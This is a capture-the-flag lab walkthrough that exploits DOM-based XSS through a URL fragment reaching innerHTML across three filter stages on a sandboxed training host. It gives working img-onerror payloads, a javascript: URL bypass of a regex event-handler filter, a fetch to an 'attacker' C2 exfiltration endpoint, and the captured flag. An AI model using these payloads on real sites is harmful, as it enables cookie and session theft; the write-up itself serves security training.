# Task 5. DOM XSS: URL Hash Hijack

## **Task 5 Description**


### 5. DOM XSS: URL Hash Hijack

Everything after `#` in a URL is called the fragment. The browser never sends it to the server. This means server-side logs are clean, WAFs see nothing, and server-side filters cannot help. The payload lives entirely in the client.

Client-side JavaScript reads `location.hash` and writes it into the page using `innerHTML`. That is your source and your sink.

#### Stage URLs

| Stage | URL | What Changes |
| :--- | :--- | :--- |
| 1 | `/product/1#TESTINPUT` | Direct `innerHTML` sink |
| 2 | `/product/1/gallery#TESTINPUT` | Script removal filter |
| 3 | `/product/1/specs#TESTINPUT` | Event handler attribute filter |

#### Mission Objectives
1. Put a marker after `#` and watch the page update without a server request.
2. Open DevTools → Sources and find the JS function that reads `location.hash`.
3. Set a breakpoint. Trace the value from `location.hash` to `innerHTML`.
4. Confirm that changing the hash updates the DOM in real time.
5. Craft a payload that executes when inserted through `innerHTML`.

#### Hints
* `<script>` injected via `innerHTML` does not execute in most browsers. Use element-event attributes instead.
* **Stage 1:** An element with a built-in fail event is your friend.
* **Stage 2:** Scripts are removed. Event attributes still work.
* **Stage 3:** Common event attributes are filtered. Think about clickable elements and alternative execution paths.

#### The Server Log Problem
```text
Server log:  GET /product/1 ← payload is invisible
Browser:     Reads location.hash → innerHTML → execution
```
This is why DOM XSS is often discovered later than reflected or stored XSS — server-side monitoring is blind to it.

#### Verification Checklist
- [ ] Network tab shows no request carrying your payload (expected hash stays client-side)
- [ ] You can trace the source (`location.hash`) to the sink (`innerHTML`) in Sources
- [ ] C2 shows impact from a DOM-only payload
- [ ] Stage 3 returns the flag

#### Repo:
* **GitHub repository:** `dlh-cyber_security`
* **Directory:** `web_application_security/websec_0x0C`
* **File:** `6-flag.txt`




## **Solution**



- Start sandbox `cyber_websec_0x0c`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.213.180 web0x0c.hbtn" | sudo tee -a /etc/hosts
```




Our goal is to trace the source (`location.hash`) to the vulnerable sink (`innerHTML`), demonstrate JavaScript execution, investigate the Stage 2 and 3 filters, and finally capture the flag in `6-flag.txt`.

The key difference from previous tasks is that this vulnerability is entirely client-side. The URL fragment is not transmitted in HTTP requests.

## Step 1: Confirm URL hash reflection

Objective: Determine where the application inserts the URL fragment into the page.

Open Firefox on Kali and navigate to:

```
http://web0x0c.hbtn/product/1#HASH_STAGE1_PROBE
```

Observe the product page and look for the text:

```
HASH_STAGE1_PROBE
```

Observation: The text appears in the page without a server request. This confirms that the application reads `location.hash` and writes it into the DOM.

```html
<!-- Section Title - VULNERABLE: populated from hash -->
<h3 id="section-title" class="text-xl font-bold mb-4">HASH_STAGE1_PROBE</h3>
```

Confirmed. Stage 1 reflects the URL fragment into the DOM.

The marker appears inside:

```html
<h3 id="section-title" class="text-xl font-bold mb-4">
    HASH_STAGE1_PROBE
</h3>
```

We have identified the destination element, `section-title`. Next, we need to establish exactly how JavaScript inserts the fragment.

## Step 2: Trace `location.hash` to the DOM sink

Objective: Find the JavaScript responsible for processing the URL fragment and determine whether it uses `innerHTML` or `textContent`.

On `http://web0x0c.hbtn/product/1#HASH_STAGE1_PROBE`:

1. Open Firefox DevTools (`F12`).
2. Select Debugger.
3. Press `Ctrl+Shift+F` to search the loaded JavaScript sources.
4. Search for:
   ```
   location.hash
   ```
5. Find the function that reads the fragment and updates the `section-title` element.


```javascript
// VULNERABLE: DOM XSS via location.hash
function loadSection() {
    const hash = decodeURIComponent(location.hash.slice(1)) || 'overview';

    // Update tab styling
    document.querySelectorAll('.tab-link').forEach(link => {
        if (link.dataset.section === hash) {
            link.classList.add('border-nexus-500', 'text-white');
            link.classList.remove('border-transparent', 'text-zinc-400');
        } else {
            link.classList.remove('border-nexus-500', 'text-white');
            link.classList.add('border-transparent', 'text-zinc-400');
        }
    });

    // VULNERABLE: hash injected directly into innerHTML

    // Stage 1: No filter
    document.getElementById('section-title').innerHTML = hash.charAt(0).toUpperCase() + hash.slice(1);


    // Load content
    const content = {
        'overview': 'Experience premium quality with the Quantum Laptop Pro. Built with cutting-edge technology and designed for professionals who demand the best.',
        'specs': '<ul class="list-disc ml-4 space-y-2"><li>High performance processor</li><li>Premium build quality</li><li>Advanced features</li><li>2 year warranty</li></ul>',
        'reviews': 'See all reviews for this product <a href="/product/1/reviews" class="text-nexus-400 hover:underline">here</a>.'
    };
    document.getElementById('section-content').innerHTML = content[hash] || content['overview'];
}
```


We've identified the exact DOM XSS source-to-sink chain in Stage 1.

| Component      | JavaScript                                           | Purpose                            |
| -------------- | ---------------------------------------------------- | ---------------------------------- |
| Source         | `location.hash.slice(1)`                             | Reads the URL fragment             |
| Decoding       | `decodeURIComponent(...)`                            | Decodes percent-encoded characters |
| Transformation | `hash.charAt(0).toUpperCase() + hash.slice(1)`       | Capitalizes the first character    |
| Sink           | `document.getElementById('section-title').innerHTML` | Parses the fragment as HTML        |

The critical vulnerability is:

```javascript
document.getElementById('section-title').innerHTML =
    hash.charAt(0).toUpperCase() + hash.slice(1);
```

Untrusted URL fragment data reaches `innerHTML` without sanitization.

## Step 3: Confirm HTML injection

Objective: Verify that the browser interprets HTML supplied through the URL fragment.

Stay on

`http://web0x0c.hbtn/product/1`.

Open Firefox DevTools → Console and execute:

```javascript
location.hash = encodeURIComponent('<b id="dom-stage1-probe">STAGE1_HTML_OK</b>')
```

This changes the fragment without reloading the page. The `encodeURIComponent()` call safely encodes the HTML for the URL.

Check two observations:

1. **`STAGE1_HTML_OK`** appears in bold inside the section title.
2. The Firefox Inspector shows an actual `<b>` element inside `section-title`:
```html
<h3 id="section-title" class="text-xl font-bold mb-4">
	<b id="dom-stage1-probe">STAGE1_HTML_OK</b>
</h3>
```

Stage 1 DOM-based HTML injection is confirmed. The URL fragment is decoded and inserted into `section-title` through `innerHTML`, creating a real HTML element.

Next, we'll test whether JavaScript executes through the same sink.

## Step 4: Confirm DOM XSS execution in Stage 1

Objective: Demonstrate that a payload supplied entirely through the URL fragment can execute JavaScript without being submitted to the server.

Stay on:

`http://web0x0c.hbtn/product/1`

Open Firefox DevTools → Console and execute:

```js
location.hash = encodeURIComponent(
    `<img src=x onerror="console.log('DOM_STAGE1_XSS_EXECUTED')">`
);
```

This payload works as follows:

- `location.hash` updates the URL fragment without reloading the page.
- `decodeURIComponent()` in `loadSection()` decodes the payload.
- `innerHTML` creates an actual `<img>` element.
- The invalid image source triggers `onerror`, executing JavaScript.

Expected Console output:

```
DOM_STAGE1_XSS_EXECUTED
```

Our Observations:

1. `DOM_STAGE1_XSS_EXECUTED` appears in the Console.
2. The Firefox Inspector shows an `<img>` element with its `onerror` attribute intact inside `section-title`.
```html
<h3 id="section-title" class="text-xl font-bold mb-4">
	<img src="x" onerror="console.log('DOM_STAGE1_XSS_EXECUTED')">
</h3>
```


Stage 1 DOM XSS is confirmed. The `location.hash` payload executes JavaScript through the `innerHTML` sink, and Firefox Inspector confirms the injected `<img onerror>` element.

Unlike stored XSS, this payload is not saved in the application database. It executes when the vulnerable page processes the crafted URL fragment.

## Step 5: Test Stage 2, Gallery

Objective: Determine whether Stage 2's script-removal filter still permits JavaScript execution through HTML event handlers.

Navigate to:

`http://web0x0c.hbtn/product/1/gallery`

Open Firefox DevTools → Console and execute:

```js
location.hash = encodeURIComponent(
    `<img src=x onerror="console.log('DOM_STAGE2_XSS_EXECUTED')">`
);
```

The Stage 2 hint says `<script>` elements are removed, but event-handler attributes may still work. We're testing that behavior using the same primitive that succeeded in Stage 1.

Expected Console output:

```
DOM_STAGE2_XSS_EXECUTED
```

Our Observations:

1. `DOM_STAGE2_XSS_EXECUTED` appears in the Console.
2. The Firefox Inspector shows an `<img>` element with its `onerror` attribute intact inside `section-title`.
```html
<h3 id="section-title" class="text-xl font-bold mb-4">
	<img src="x" onerror="console.log('DOM_STAGE2_XSS_EXECUTED')">
</h3>
```

Stage 2 DOM XSS is confirmed. The gallery page allows JavaScript execution through an HTML event handler despite its script-removal filter.

This demonstrates that filtering `<script>` elements does not prevent XSS through other HTML elements.

## Step 6: Investigate Stage 3, Specs

Objective: Determine whether Stage 3 blocks the event-handler technique that succeeded in Stages 1 and 2.

Navigate to:

`http://web0x0c.hbtn/product/1/specs`

Open Firefox DevTools → Console and execute:

```js
location.hash = encodeURIComponent(
    `<img src=x onerror="console.log('DOM_STAGE3_XSS_EXECUTED')">`
);
```

The Stage 3 description indicates that common event-handler attributes are filtered. This experiment will establish how that filtering affects our payload.

Our observations:

1. Console: "%3Cimg%20src%3Dx%20onerror%3D%22console.log('DOM_STAGE3_XSS_EXECUTED')%22%3E"

2. Inspector: inside `<h3 id="section-title">` HTML appears `data-blocked=`

```html
<h3 id="section-title" class="text-xl font-bold mb-4">
	<img src="x" data-blocked="console.log('DOM_STAGE3_XSS_EXECUTED')">
</h3>
```

Stage 3 blocks the `onerror` handler, unlike Stages 1 and 2.

Two important notes:

- The `<img>` element survives, but `onerror` has been renamed to `data-blocked`. That prevents the browser from executing the handler.
- The percent-encoded string in the Console is the result of assigning the encoded fragment to `location.hash`, not evidence of XSS execution.

The filter is modifying attributes rather than escaping the entire HTML element.

## Step 7: Inspect the Stage 3 filtering logic

Objective: Identify exactly how Stage 3 detects and rewrites event-handler attributes before attempting a bypass.

On `http://web0x0c.hbtn/product/1/specs`:

1. Open Firefox DevTools (`F12`).
2. Select Debugger.
3. Press `Ctrl+Shift+F` to search the loaded sources.
4. Search for:
   ```
   data-blocked
   ```
5. The snippet responsible for `data-blocked`:

```javascript
    // VULNERABLE: hash injected directly into innerHTML

    // Stage 3: Stricter filter
    let safeHash = hash.replace(/<script[^>]*>.*?<\/script>/gi, '')
                       .replace(/on\w+\s*=/gi, 'data-blocked=');
    document.getElementById('section-title').innerHTML = safeHash.charAt(0).toUpperCase() + safeHash.slice(1);

```

We now have the exact Stage 3 filtering logic, and it reveals a promising bypass.

## Step 8: Test XSS through a JavaScript URL



The sanitizer applies two regular expressions:

| Filter                           | What it blocks                                             |
| -------------------------------- | ---------------------------------------------------------- |
| `/<script[^>]*>.*?<\/script>/gi` | Certain `<script>...</script>` elements                    |
| `/on\w+\s*=/gi`                  | Event-handler attributes such as `onerror=` and `onclick=` |

The weakness: Neither expression checks URL schemes. An HTML anchor using `href="javascript:..."` may therefore survive.

### Action: Test an interactive XSS payload

On `http://web0x0c.hbtn/product/1/specs`, open Firefox DevTools → Console and execute:

```js
location.hash = encodeURIComponent(
    `<a href="javascript:console.log('DOM_STAGE3_LINK_EXECUTED')">CLICK_TO_TEST_XSS</a>`
);
```

The section title should now display a link labeled `CLICK_TO_TEST_XSS`.

Click that link.

Expected Console output:

```
DOM_STAGE3_LINK_EXECUTED
```

Unlike our Stage 1 and 2 payloads, this one requires user interaction.

Our observations:

1. `DOM_STAGE3_LINK_EXECUTED` appears in the Console after clicking ✅
2. The Firefox Inspector shows inside `section-title`:

```html
<h3 id="section-title" class="text-xl font-bold mb-4">
	<a href="javascript:console.log('DOM_STAGE3_LINK_EXECUTED')">
		CLICK_TO_TEST_XSS
	</a>
</h3>
```

Stage 3 DOM XSS is confirmed. We've successfully bypassed the event-handler filter using a `javascript:` URL.

The important distinction is that Stage 3 requires a click, whereas the Stage 1 and 2 payloads executed automatically.

## Step 9: Verify C2 communication from Stage 3

Objective: Confirm that JavaScript executed through the URL fragment can communicate with the lab's C2 endpoint.

We'll reuse `/attacker/api/exfil` from earlier tasks, sending a harmless marker instead of sensitive data.

On `http://web0x0c.hbtn/product/1/specs`, open Firefox DevTools → Console and execute:

```js
location.hash = encodeURIComponent(
    `<a href="javascript:fetch('/attacker/api/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cookies',data:'DOM_STAGE3_C2_PROOF',level:7,stage:3})}).then(r=>console.log('C2_STATUS:',r.status))">SEND_C2_TEST</a>`
);
```

We are provisionally using Level 7, based on the preceding challenges. We will verify the level separately.

Click the newly displayed `SEND_C2_TEST` link.

Expected Console result:

```
C2_STATUS: 200
```

The request sends this JSON to the lab's C2 endpoint:

```
{
  "type": "cookies",
  "data": "DOM_STAGE3_C2_PROOF",
  "level": 7,
  "stage": 3
}
```

The `data` value is a synthetic proof marker, not stolen cookie data.

Our observations:

1. The Console displays `C2_STATUS: 200` ✅
2. The C2 dashboard at `http://web0x0c.hbtn/attacker` shows a record containing
```
COOKIES: Level 7 / Stage 3 • 2026-11-01 15:55:35
DOM_STAGE3_C2_PROOF
```

Stage 3 DOM XSS and C2 communication are now confirmed.

The results establish that:

- The `javascript:` link bypasses Stage 3's event-handler filter.
- JavaScript executes when the injected link is clicked.
- The C2 endpoint accepts the request with HTTP `200 OK`.
- The C2 dashboard records `DOM_STAGE3_C2_PROOF` under Level 7 / Stage 3.

The C2 evidence uses a synthetic marker, not actual stolen cookies. That's sufficient to demonstrate outbound communication from the DOM XSS payload.

## Step 10: Identify the tracking endpoint

We have confirmed Level 7, Stage 3. Now we need the correct flag-tracking endpoint.

Based on the previous challenges, `/product/hash/api/track` is a plausible candidate, but it hasn't been verified.

Action: On `http://web0x0c.hbtn/product/1/specs`, open Firefox DevTools → Console and execute:

```js
fetch('/product/api/track?t=test')
    .then(async r => {
        console.log('TRACK_STATUS:', r.status);
        console.log('TRACK_RESPONSE:', await r.text());
    })
    .catch(console.error);
```

The outcome:
```
TRACK_STATUS: 200 ✅
TRACK_RESPONSE: {"status":"error"}
```

We've identified the correct tracking endpoint:

```
/product/api/track
```

The response `200 OK` with `{"status":"error"}` confirms the endpoint exists but rejects the deliberately invalid test token.

We now have all the components needed for a Stage 3 flag attempt: confirmed DOM XSS execution, C2 evidence, Level 7 / Stage 3, and a valid tracking endpoint.

## Step 12: Capture the flag through the DOM XSS payload

Objective: Use our confirmed `javascript:` link bypass to read the page's tracking token and submit it to `/product/api/track`.

On:

`http://web0x0c.hbtn/product/1/specs`

Open Firefox DevTools → Console and execute:

```js
location.hash = encodeURIComponent(
    `<a href="javascript:fetch('/product/api/track?t='+encodeURIComponent(document.getElementById('tracking-id').textContent.trim())).then(r=>r.text()).then(t=>console.log('TRACK_RESULT:',t))">CAPTURE_STAGE3_FLAG</a>`
);
```

The payload follows the same execution path we already verified:

1. `location.hash` supplies the payload.
2. Stage 3's regular-expression filters fail to block the `javascript:` URL.
3. `innerHTML` creates the clickable link.
4. Clicking the link executes JavaScript, reads `tracking-id`, and submits it using the active browser session.

Action: Click `CAPTURE_STAGE3_FLAG` in the section title.

The Console output:

```json
TRACK_RESULT: {"ref":"FLAG{f10480356860a010a1f2c403cf62ee41}","status":"tracked"}
```

> **Task 5: Flag captured**

Stage 3 DOM XSS was successfully exploited!



This confirms the complete exploitation chain:

1. The URL fragment supplied the malicious HTML.
2. Stage 3's regex filters failed to block the `javascript:` URL.
3. The `innerHTML` sink created an executable link.
4. Clicking the link executed JavaScript and submitted the tracking token.
5. `/product/api/track` accepted the token and returned the flag.

Unlike Task 4, we captured this flag through the actual DOM XSS vulnerability, not by manually invoking the tracking endpoint from the Console.

## Step 13: Save the flag and Verify


```bash
echo f10480356860a010a1f2c403cf62ee41 > 6-flag.txt
git add .
git commit -m "6-flag.txt"
git push
```
